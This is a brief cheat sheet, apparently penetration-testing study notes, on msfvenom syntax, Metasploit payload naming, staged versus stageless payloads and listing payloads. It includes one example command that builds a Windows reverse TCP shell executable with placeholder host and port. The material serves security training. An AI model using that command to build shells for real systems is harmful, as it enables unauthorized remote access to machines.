    **STANDARD SYNTAX**  
  
msfvenom -p <payload> <options>  
  
_Ex:_ msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=<ip> LPORT=<port>
	
	
---
	
    **PAYLOAD NAMING CONVENTIONS**  
  
<OS> / <arch> / <payload>  
  
_ex: linux/x86/shell\_reverse\_tcp_  
  
  
Windows 32 arch is not specified  
_/windows/shell\_reverse\_tcp_  
  
64 bit windows is specified as x64  
_windows/x64/shell\_reverse\_tcp_  
  
  
\* Stageless payloads are denoted with \_  
\*\*Staged payloads are denoted with /  
  
  
**PAYLOAD SEARCH**  
msfvenom --list payloads